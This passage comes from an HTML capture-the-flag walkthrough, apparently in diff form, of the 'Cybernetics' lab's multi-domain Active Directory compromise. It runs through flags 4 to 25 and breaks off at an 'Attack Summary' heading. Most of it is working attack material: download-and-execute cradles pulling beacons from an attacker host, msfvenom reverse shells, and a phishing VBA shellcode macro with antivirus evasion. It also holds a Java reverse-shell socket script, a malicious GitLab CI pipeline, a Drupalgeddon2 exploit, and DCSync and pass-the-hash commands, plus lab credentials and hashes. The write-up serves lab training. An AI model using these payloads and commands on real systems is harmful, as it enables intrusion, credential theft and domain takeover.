+  <pre><code class="language-powershell"># Execute the RBCD chain
+iex ((new-object net.webclient).downloadstring("http://10.10.14.150:443/root.ps1"))
+iex ((new-object net.webclient).downloadstring("http://10.10.14.150:443/doit.ps1"))
+
+# Get S4U ticket with Rubeus
+.\Rubeus.exe tgtdeleg
+.\Rubeus.exe s4u /user:svc_apache /ticket:<TGT> /impersonateuser:Administrator /msdsspn:cifs/m3dc.m3c.local /ptt</code></pre>
+</div>
+
+<p>With Administrator access to M3DC, we use PsExec to get a shell:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell">.\PsExec.exe -accepteula \\m3dc powershell -c "iwr -usebasicparsing 10.10.14.150/win64 -outfile c:\programdata\win64.exe;c:\programdata\win64.exe"</code></pre>
+</div>
+
+<div class="flag-box"><div class="flag-label">Flag 4 — Constrained Delegation</div><div class="flag-value">Cyb3rN3t1C5{C0n$tr@!n3d!}</div></div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="dcsync-m3c">DCSync &mdash; M3C.LOCAL</h2>
+
+<p>As Domain Admin on M3DC, we dump all domain credentials using ntdsutil:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Dump NTDS database
+ntdsutil activate instance ntds ifm create full C:\ntdsutil quit quit
+
+# Extract hashes offline
+secretsdump.py -security ntdsutil/registry/SECURITY -system ntdsutil/registry/SYSTEM -ntds "ntdsutil/Active Directory/ntds.dit" LOCAL</code></pre>
+</div>
+
+<p>This reveals a transitive trust relationship between <code>m3c.local</code> and <code>cyber.local</code>, opening the path to the parent and child domains.</p>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="corewebdl">Cross-Domain &mdash; COREWEBDL (10.9.15.11)</h2>
+
+<p>Host scanning from M3DC reveals machines in the 10.9.15.0/24 subnet. Port 80 is open on 10.9.15.11. Browsing to this address shows a corporate website with information about network segmentation, Zabbix monitoring, and certificate enrollment procedures.</p>
+
+<h3 id="drupal-rce">Drupalgeddon2 RCE</h3>
+
+<p>The website footer reveals it runs Drupal CMS. Droopescan confirms the version, and CVE-2018-7600 (Drupalgeddon2) provides unauthenticated remote code execution:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Scan Drupal version
+droopescan scan drupal -u http://10.9.15.11/
+
+# Exploit with Drupalgeddon2
+ruby drupalgeddon2.rb http://10.9.15.11</code></pre>
+</div>
+
+<p>A shell is obtained as the web service user on COREWEBDL (a Linux machine). A beacon is dropped for persistent access:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">wget 10.10.14.150/lin64 -O /tmp/lin64
+chmod 755 /tmp/lin64
+/tmp/lin64</code></pre>
+</div>
+
+<div class="flag-box"><div class="flag-label">Flag 5 — Welcome to Cybernetics</div><div class="flag-value">Cyb3rN3t1C5{W3lC0m3_2_Cyb3rn3t!cs}</div></div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="adtool-enum">AD Enumeration with adtool (Flag 6)</h2>
+
+<p>COREWEBDL has PBIS installed, enabling Active Directory enumeration using <code>adtool</code> with the machine's Kerberos keytab. We enumerate organizational units, users, and their attributes. Examining user descriptions reveals credentials for George Wirth:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Enumerate users with descriptions
+./adtool --keytab=/etc/krb5.keytab --logon-as=COREWEBDL$ -a search-user \
+  --search-base 'OU=Users,OU=core,DC=core,DC=cyber,DC=local' --name '*' | xargs \
+  -I{} ./adtool --keytab=/etc/krb5.keytab --logon-as=COREWEBDL$ -a lookup-object --dn "{}"
+
+# Get specific description
+./adtool --keytab=/etc/krb5.keytab --logon-as=COREWEBDL$ -a lookup-object \
+  --attr=description --dn 'CN=George Wirth,OU=Interns,OU=Users,OU=core,DC=core,DC=cyber,DC=local'</code></pre>
+</div>
+
+<div class="flag-box"><div class="flag-label">Flag 6 — Credentials in Descriptions</div><div class="flag-value">Cyb3rN3t1C5{Cr3d$_!n_De$cr!pti0ns}</div></div>
+
+<p>Credentials found: <code>George.Wirth:v765#QLm^8</code></p>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="adcs-owa">Certificate Enrollment &amp; OWA Access</h2>
+
+<p>Using George Wirth's credentials, we download the RootCA from the SYSVOL share on the domain controller:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">smbclient -U 'CORE\George.Wirth%v765#QLm^8' //10.9.10.10/SYSVOL</code></pre>
+</div>
+
+<p>The certificate enrollment process requires Windows. After installing OpenVPN and connecting, we import the RootCA, add a new enrollment policy pointing to <code>https://certenroll.cyber.local/ADPolicyProvider_CEP_UsernamePassword/service.svc/CEP</code>, authenticate with George's credentials, and request a UserCert. With the certificate installed, we can access the Outlook Web App (OWA) at <code>https://mail.cyber.local/owa/</code>.</p>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="phishing-corewkt001">Phishing &mdash; COREWKT001 (Flag 7)</h2>
+
+<p>With OWA access, the next logical step is phishing. The target is <code>Ilene_Rasch@cyber.local</code>, identified from the corporate website. A macro-based attack is crafted using shellcode embedded in a Word document:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell"># Generate shellcode with msfvenom
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.150 LPORT=443 -f csharp
+
+# Encode shellcode (add 2 to each byte, wrap in VBA array)
+# Purge with BadAssMacros to evade AV detection</code></pre>
+</div>
+
+<p>The VBA macro uses <code>VirtualAlloc</code>, <code>RtlMoveMemory</code>, and <code>CreateThread</code> to execute the encoded shellcode in memory. After sending the .docm file to Ilene via email, a bot on COREWKT001 executes the macro, giving us a shell. Examining scheduled tasks reveals the <code>OpenEmail</code> task and its associated PowerShell module <code>Invoke-OpenEmail</code>:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell"># View scheduled task details
+schtasks /query /v /tn:openemail
+
+# Task runs: powershell.exe -windowstyle minimized Invoke-OpenEmail
+# Module at: C:\Program Files\WindowsPowerShell\Modules\Invoke-OpenEmail\</code></pre>
+</div>
+
+<div class="flag-box"><div class="flag-label">Flag 7 — Phishing</div><div class="flag-value">Cyb3rN3t1C5{Y0u_C@nt_Ph!$h_M3}</div></div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="code-signing">AlwaysInstallElevated &amp; Code Signing (Flags 8-9)</h2>
+
+<p>Regular enumeration on COREWKT001 shows that <code>AlwaysInstallElevated</code> is configured in both HKLM and HKCU registry keys. This means MSI files run with elevated privileges regardless of the executing user. However, the lab enforces code signing policies, so the MSI must be signed with a valid certificate.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell"># Verify AlwaysInstallElevated is set
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></pre>
+</div>
+
+<h3 id="devops-share">DevOps Share &mdash; Encrypted Credentials</h3>
+
+<p>Enumerating SMB shares on <code>cyfs.cyber.local</code> reveals a readable <code>DevOps</code> share containing encrypted credentials. The <code>ReadMe.txt</code> explains this is an example of securely storing credentials, and <code>passwd.txt</code> contains an SSAPI-encrypted string alongside <code>aes.key</code> with decimal AES key values.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-python">#!/usr/bin/env python
+import base64
+from Crypto.Cipher import AES
+
+SS_DEFAULT_HEADER = '76492d1116743f0423413b16050a5345'
+SS_DEFAULT_ENCODING = 'utf_16_le'
+
+def convert_to_secure_string(key, data, header=SS_DEFAULT_HEADER, enc=SS_DEFAULT_ENCODING):
+    key_str = str(bytearray(key))
+    data = data[len(header):]
+    p = base64.b64decode(data)
+    if enc:
+        p = p.decode(enc)
+    p = p.split('|')
+    if len(p) != 3 or p[0] != '2':
+        return None
+    iv_str = base64.b64decode(p[1])
+    ciphertext = p[2].decode('hex')
+    cipher = AES.new(key_str, AES.MODE_CBC, iv_str)
+    decrypted = cipher.decrypt(ciphertext)
+    return decrypted.rstrip('\x00')</code></pre>
+</div>
+
+<div class="flag-box"><div class="flag-label">Flag 8 — DevOps Secure Credentials</div><div class="flag-value">Cyb3rN3t1C5{D3vOP$_S3cure_Cr3d$}</div></div>
+
+<h3 id="signing-msi">Signing the MSI</h3>
+
+<p>To get a signing certificate, we request a <code>CyberSigning</code> certificate from ADCS using Robert.Ortiz's credentials. After importing the certificate, we retrieve its thumbprint and sign the MSI:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell"># Sign the MSI with the certificate
+$cert = Get-ChildItem Cert:\CurrentUser\My\<THUMBPRINT>
+Set-AuthenticodeSignature -Certificate $cert -FilePath .\cre4k.msi
+
+# Execute the signed MSI for SYSTEM
+msiexec /quiet /qn /i cre4k.msi</code></pre>
+</div>
+
+<div class="flag-box"><div class="flag-label">Flag 9 — DevOps Code Signing</div><div class="flag-value">Cyb3rN3t1C5{D3vOP$_C0d3_S!gning}</div></div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="corewkt002">RBCD &mdash; COREWKT002 (Flag 10)</h2>
+
+<p>BloodHound reveals that <code>Ilene.Rasch</code> has <code>AllExtendedRights</code> and <code>WriteAccountRestrictions</code> over COREWKT002. This allows another RBCD attack &mdash; setting <code>PrincipalsAllowedToDelegateToAccount</code> on COREWKT002 to COREWKT001, then using Rubeus S4U to impersonate Administrator:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell"># Set RBCD using ActiveDirectory module
+$src = Get-ADComputer COREWKT001 -server coredc.core.cyber.local
+$tgt = Get-ADComputer COREWKT002 -server coredc.core.cyber.local
+Set-ADComputer -Identity $tgt -PrincipalsAllowedToDelegateToAccount $src -server coredc.core.cyber.local
+
+# S4U with Rubeus
+.\rubeus.exe tgtdeleg
+.\rubeus.exe s4u /ticket:<TGT> /impersonateuser:Administrator /msdsspn:cifs/COREWKT002.core.cyber.local /altservice:cifs,host,ldap,http /ptt</code></pre>
+</div>
+
+<div class="flag-box"><div class="flag-label">Flag 10 — CreatorSID</div><div class="flag-value">Cyb3rN3t1C5{CR3@t0rS!D}</div></div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="corewebtw">COREWEBTW &mdash; Tomcat WAR (Flag 11)</h2>
+
+<p>On COREWKT002, running mimikatz <code>lsadump::secrets</code> reveals additional credentials. Spraying these across the domain with crackmapexec finds a valid login for COREWEBTW. The machine has a Tomcat installation listening on port 8080. We exploit this by uploading a WAR file containing a JSP reverse shell:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Create WAR payload
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.150 LPORT=443 -f war > jspShell.war
+
+# Transfer to Tomcat webapps directory
+# Machine auto-deploys WAR, creating jspShell directory
+
+# Trigger shell
+# Browse to: http://corewebtw.core.cyber.local:8080/jspShell/ulgwfnhfbxkwr.jsp</code></pre>
+</div>
+
+<p>The initial shell runs as <code>NT AUTHORITY\NETWORK SERVICE</code>, which has <code>SeImpersonatePrivilege</code>. SweetPotato elevates to SYSTEM:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell">SweetPotato.vmp.exe -p c:\programdata\win64.exe -e EfsRpc</code></pre>
+</div>
+
+<div class="flag-box"><div class="flag-label">Flag 11 — Tomcat Web Apps</div><div class="flag-value">Cyb3rN3t1C5{T0mc@t_W3b@pp$}</div></div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="unconstrained-dcsync">Unconstrained Delegation &amp; DCSync (Flags 12-15)</h2>
+
+<p>COREWEBTW has unconstrained delegation enabled. This is a powerful misconfiguration that allows the machine to cache TGTs of any user who authenticates to it. Using the SpoolSample trick, we can force a domain controller to authenticate to our compromised machine, capturing its TGT:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell"># Terminal 1: Monitor for incoming TGTs
+.\Rubeus.exe monitor /interval:1
+
+# Terminal 2: Trigger authentication via Print Spooler
+.\SpoolSample.exe coredc.core.cyber.local corewebtw.core.cyber.local</code></pre>
+</div>
+
+<p>Rubeus captures the TGT for COREDC$. We pass the ticket and use DCSync to dump all domain hashes:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell"># Pass the captured ticket
+.\rubeus.exe ptt /ticket:<CAPTURED_TGT>
+
+# DCSync the cyber.local domain
+.\mimikatz.exe "token::elevate" "lsadump::dcsync /user:CORE\krbtgt /all" "exit"</code></pre>
+</div>
+
+<p>With Domain Admin hashes for both <code>cyber.local</code> and <code>core.cyber.local</code>, we can now access any machine in these domains.</p>
+
+<h3 id="cyapp-flags">CYAPP &mdash; RDS Flags (12-13)</h3>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Access CYAPP with DA hash
+evil-winrm -H 8306115eb5aeb7072c5c601b8507a562 -u Administrator -i cydc.cyber.local
+
+# Access CYAPP directly
+wmiexec.py -hashes :20722596f1c4c20088e44e9c051dc284 John.Braud@cyapp.cyber.local</code></pre>
+</div>
+
+<div class="flag-box"><div class="flag-label">Flag 12 — RDS User Shell</div><div class="flag-value">Cyb3rN3t1C5{RD$_U$3r_$h3ll}</div></div>
+
+<div class="flag-box"><div class="flag-label">Flag 13 — RDS App Breakout</div><div class="flag-value">Cyb3rN3t1C5{RD$_App$_Br3ak0ut$}</div></div>
+
+<h3 id="parent-child-flags">Parent &amp; Child Domain Takeover (14-15)</h3>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Access CYDC (parent domain)
+evil-winrm -H 8306115eb5aeb7072c5c601b8507a562 -u Administrator -i cydc.cyber.local
+
+# Access COREDC (child domain)
+evil-winrm -u Administrator -H b519f7764f7672e6a4a77cba6fb8fcdf -i coredc.core.cyber.local</code></pre>
+</div>
+
+<div class="flag-box"><div class="flag-label">Flag 14 — Parent Domain Takeover</div><div class="flag-value">Cyb3rN3t1C5{P@r3nt_D0ma!n_T@ke0v3r}</div></div>
+
+<div class="flag-box"><div class="flag-label">Flag 15 — Child Domain Takeover</div><div class="flag-value">Cyb3rN3t1C5{Ch!ld_D0ma!n_T@ke0v3r}</div></div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="monitor">Monitor &mdash; Zabbix RCE (Flag 16)</h2>
+
+<p>The flag name "Monitoring tools gone astray" hints at the Zabbix monitoring platform. Port scanning reveals port 80 on 10.9.10.16. Directory scanning discovers <code>/zabbix</code>. The Zabbix API is accessible without GUI authentication. Using the credentials <code>zabapi:Zabbix</code> (found from corewebdl's Drupal data), we authenticate via the JSON-RPC API:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">json</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-json">{
+  "params": {
+    "password": "Zabbix",
+    "user": "zabapi"
+  },
+  "jsonrpc": "2.0",
+  "method": "user.login",
+  "id": 1
+}</code></pre>
+</div>
+
+<p>The API session token allows us to create new monitoring items with the <code>system.run</code> key, which executes arbitrary commands on the monitored host:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">json</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-json">{
+  "params": {
+    "name": "arbitraryName",
+    "key_": "system.run[\"whoami\"]",
+    "hostid": "10106",
+    "type": 0,
+    "value_type": 3,
+    "interfaceid": 2,
+    "delay": 60
+  },
+  "jsonrpc": "2.0",
+  "method": "item.create",
+  "auth": "8e86b3f9d793256b07aeef1c4c82f608",
+  "id": 1
+}</code></pre>
+</div>
+
+<div class="flag-box"><div class="flag-label">Flag 16 — Monitor Tool RCE</div><div class="flag-value">Cyb3rN3t1C5{M0n!t0r_t00l_RC3}</div></div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="jenkins">Jenkins &mdash; D3WEBJW (Flag 17)</h2>
+
+<p>Spraying the password obtained from the Zabbix user reveals valid credentials for <code>James.Peck@d3v.local:ohD6ubo5ie</code>. Using certipy (version 2.0.9, as 4.0 has compatibility issues), we request a certificate and access <code>https://jenkins.cyber.local</code>. The Jenkins instance has an accessible Script Console, allowing Groovy code execution:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">java</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-java">String host = "10.10.14.150";
+int port = 8044;
+String cmd = "cmd.exe";
+Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
+Socket s = new Socket(host, port);
+InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
+OutputStream po = p.getOutputStream(), so = s.getOutputStream();
+while (!s.isClosed()) {
+  while (pi.available() > 0) so.write(pi.read());
+  while (pe.available() > 0) so.write(pe.read());
+  while (si.available() > 0) po.write(si.read());
+  so.flush(); po.flush();
+  Thread.sleep(50);
+  try { p.exitValue(); break; } catch (Exception e) {}
+}
+p.destroy(); s.close();</code></pre>
+</div>
+
+<p>SeImpersonatePrivilege is present again. SweetPotato provides SYSTEM:</p>
+
+<div class="flag-box"><div class="flag-label">Flag 17 — Jenkins SAML</div><div class="flag-value">Cyb3rN3t1C5{J3nk!n$_$AML}</div></div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="vault-ansible">HashiCorp Vault &amp; Ansible (Flags 18-20)</h2>
+
+<h3 id="vault">HashiCorp Vault (Flag 18)</h3>
+
+<p>Notes found on D3WEBJW contain development instructions mentioning Vault configuration and Ansible playbook secrets. Encrypted files include <code>ansible_passwd.txt</code> (SSAPI-encrypted base64) and <code>ansible_aes.key</code> (decimal AES key). Decrypting with PowerShell reveals the Ansible service password:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell">$encryptedPassword = "76492d1116743f0423413b16050a5345MgB8AEwAbgBiADIAaQBCAEIAMgBTADkARQBVAEsASwBhAFkAcQBpAHIAawBLAGcAPQA9AHwAYQBjAGIAMQA5ADQANAA2AGIAMABhADEANgAwAGUAMgBhADUAMwBkADYANQA4ADQAYwBmADkAZAA3AGQAMQAyADAANQAxADQAMwAwADcAOQBjADYAZQAyADEAYgBlADUAOQA3ADgAMgAyAGUAYwA0ADgAMwA4AGEAYwA1AGMAZgA="
+$key = (49,222,253,86,26,137,92,43,29,200,17,203,88,97,39,38,60,119,46,44,219,179,13,194,191,199,78,10,4,40,87,159)</code></pre>
+</div>
+
+<p>SSH into the Ansible machine with James.Weeks credentials, then access Vault:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># SSH to ansible machine
+ssh JAMES.WEEKS@ansible.cyber.local
+
+# Access HashiCorp Vault
+export VAULT_ADDR=http://10.9.30.13:8200
+./vault login -method=userpass username=ansible
+# Password: 6daDjIU0UqEdvGI
+
+# List and read secrets
+./vault kv list secret/
+./vault kv get secret/Cybernetics-Flag</code></pre>
+</div>
+
+<div class="flag-box"><div class="flag-label">Flag 18 — Vault API</div><div class="flag-value">Cyb3rN3t1C5{V@ult_AP!}</div></div>
+
+<h3 id="ansible-decrypt">Ansible Vault Decryption (Flag 19)</h3>
+
+<p>The <code>/ansible</code> directory contains encrypted Ansible Vault files. The vault password (from HashiCorp Vault: <code>aXYxQqxIWldJHX5sJVrCzVEkdQmP33</code>) decrypts them:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Decrypt ansible-vault encrypted file
+ansible-vault decrypt flag.yml --output=/dev/stdout
+# Supply password: aXYxQqxIWldJHX5sJVrCzVEkdQmP33</code></pre>
+</div>
+
+<div class="flag-box"><div class="flag-label">Flag 19 — Ansible Encryption</div><div class="flag-value">Cyb3rN3t1C5{An$!bl3_3ncrypt!0n}</div></div>
+
+<h3 id="d3dc">D3DC (Flag 20)</h3>
+
+<p>The <code>group_vars</code> directory contains another encrypted variable: <code>ansible_password</code> for <code>Administrator@D3V.LOCAL</code>. Decrypting with the same vault password reveals the Domain Admin credentials for the D3V domain. Using evil-winrm with these credentials provides access to D3DC:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Access D3DC with decrypted Administrator credentials
+evil-winrm -u Administrator@D3V.LOCAL -p '<DECRYPTED_PASSWORD>' -i d3dc.d3v.local</code></pre>
+</div>
+
+<div class="flag-box"><div class="flag-label">Flag 20 — Core Meltdown</div><div class="flag-value">Cyb3rN3t1C5{C0r3_M3ltd0wn}</div></div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="inception">Inception Domain (Flags 21-25)</h2>
+
+<h3 id="unattended-creds">Unattended Credentials (Flag 21)</h3>
+
+<p>Returning to CYDC, we spray dumped hashes against the inception.local domain and find Robert.Lanza is valid. Host discovery reveals machines at 10.9.40.x. The SMB share <code>ADMINS$</code> (note the S) on INWKT001 contains what looks like <code>C:\windows</code>. Within <code>C:\windows\panther</code>, unattended installation XML files contain credentials:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">xml</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-xml">&lt;UserAccounts&gt;
+  &lt;LocalAccounts&gt;
+    &lt;LocalAccount wcm:action="add"&gt;
+      &lt;Password&gt;
+        &lt;Value&gt;Q3liM3JOM3QxQzV7VW5AdHQzbmRKMCFuQ3IzZCR9&lt;/Value&gt;
+        &lt;PlainText&gt;false&lt;/PlainText&gt;
+      &lt;/Password&gt;
+      &lt;DisplayName&gt;Administrator&lt;/DisplayName&gt;
+      &lt;Group&gt;Administrators&lt;/Group&gt;
+      &lt;Name&gt;Administrator&lt;/Name&gt;
+    &lt;/LocalAccount&gt;
+  &lt;/LocalAccounts&gt;
+&lt;/UserAccounts&gt;</code></pre>
+</div>
+
+<p>The base64-encoded password decodes to the flag:</p>
+
+<div class="flag-box"><div class="flag-label">Flag 21 — Unattended Join Creds</div><div class="flag-value">Cyb3rN3t1C5{Un@tt3ndJ0!nCr3d$}</div></div>
+
+<h3 id="ruler-phishing">Ruler Phishing &mdash; INWKT001 (Flags 22-23)</h3>
+
+<p>Robert.Lanza has AllExtendedRights over INWKT001, but RBCD via PowerShell doesn't work from CYDC. Instead, we use the Ruler tool to exploit Exchange and gain code execution through homepage modification and .hta delivery:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Add homepage rule via Ruler
+./ruler.exe -u Robert.Lanza -p "U=zk1J.TYru U*" -e robert.lanza@cyber.local \
+  -d CYBER.local --insecure homepage add -u http://10.10.14.150:443/webdav/test.html
+
+# Add form rule with HTA payload
+./ruler.exe --email robert.lanza@cyber.local --username robert.lanza \
+  --password "U=zk1J.TYruU*" add --location "\\\\10.10.14.150@8080\\webdav\\shell.hta"</code></pre>
+</div>
+
+<div class="flag-box"><div class="flag-label">Flag 22 — Office Shells</div><div class="flag-value">Cyb3rN3t1C5{0ff!c3Sh3llz}</div></div>
+
+<p>Robert's desktop contains a VPN folder with an EFS-encrypted <code>otp.png</code> file. After importing the EFS certificate from the certificate store and adding it to Trusted People, the file becomes readable. The QR code inside contains a TOTP secret for VPN authentication:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Check EFS certificate fingerprint
+cipher /c .\otp.png
+
+# Import certificate to current user store
+move-item -path cert:\CurrentUser\TrustedPeople\54A125B3FAEEAFE7C7546165C4E77DD87D3BF0E1 \
+  -destination cert:\CurrentUser\MY\
+
+# Read the QR code: otpauth://totp/Robert.Lanza@OPNsense?secret=QZRPBGCUGGDFJZDKRBZGXZYG7LMTMX3N</code></pre>
+</div>
+
+<div class="flag-box"><div class="flag-label">Flag 23 — EFS Encryption</div><div class="flag-value">Cyb3rN3t1C5{EF$_3ncrypt3!0n}</div></div>
+
+<h3 id="gitlab-rce">GitLab RCE &mdash; INWEBJW (Flag 24)</h3>
+
+<p>After connecting via VPN with Robert.Lanza's credentials + TOTP, Responder captures NTLM authentication from <code>svc_inventory</code>. NTLM relay to INWKT002 gives SQL access with sa privileges. Enabling <code>xp_cmdshell</code> yields a shell, and a <code>DevOPS</code> folder contains <code>gitlab.txt</code> with an access token.</p>
+
+<p>GitLab version 13.2.6 is vulnerable to CI/CD pipeline RCE. We create a project, add a malicious <code>.gitlab-ci.yml</code> that executes a PowerShell beacon, and trigger the pipeline:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Access GitLab API
+curl -s --header "Authorization: Bearer sgvzNuXEiz48geasgxBD" \
+  "http://gitlab.inception.local/api/v4/user"
+
+# Create a project
+curl -X POST --header "Authorization: Bearer sgvzNuXEiz48geasgxBD" \
+  'http://gitlab.inception.local/api/v4/projects?name=test2&visibility=public'
+
+# Add user to project
+curl -X POST --header "Authorization: Bearer sgvzNuXEiz48geasgxBD" \
+  'http://gitlab.inception.local/api/v4/projects/6/members?user_id=6&access_level=40'</code></pre>
+</div>
+
+<p>The <code>.gitlab-ci.yml</code> pipeline executes PowerShell on the runner:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">yaml</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">stages:
+  - build
+build_job:
+  stage: build
+  tags:
+    - powershell
+  script:
+    - 'iwr -usebasicparsing -outfile c:\programdata\win64.exe 10.10.14.150/win64; c:\programdata\win64.exe'</code></pre>
+</div>
+
+<div class="flag-box"><div class="flag-label">Flag 24 — GitLab RCE</div><div class="flag-value">Cyb3rN3t1C5{G!tl@bRC3}</div></div>
+
+<h3 id="gmsa-indc">GMSA Password &mdash; INDC (Flag 25)</h3>
+
+<p>BloodHound shows that INWEBJW can read the GMSA (Group Managed Service Account) password of <code>svc_gitlab_rn$</code>, which is a Domain Admin. Using GMSAPasswordReader, we extract the NT hash:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell"># Read GMSA password
+.\GMSAPasswordReader.exe --AccountName SVC_GITLAB_RN
+# Hash: B9B9F9055BBA4DF0FC6805865D14A84A
+
+# Authenticate as GMSA to DC
+evil-winrm -u 'SVC_GITLAB_RN$' -H 'B9B9F9055BBA4DF0FC6805865D14A84A' -i indc.inception.local</code></pre>
+</div>
+
+<div class="flag-box"><div class="flag-label">Flag 25 — Never Stop Dreaming</div><div class="flag-value">Cyb3rN3t1C5{N3v3r$t0pDr3@m!ng}</div></div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="summary">Attack Summary</h2>
+
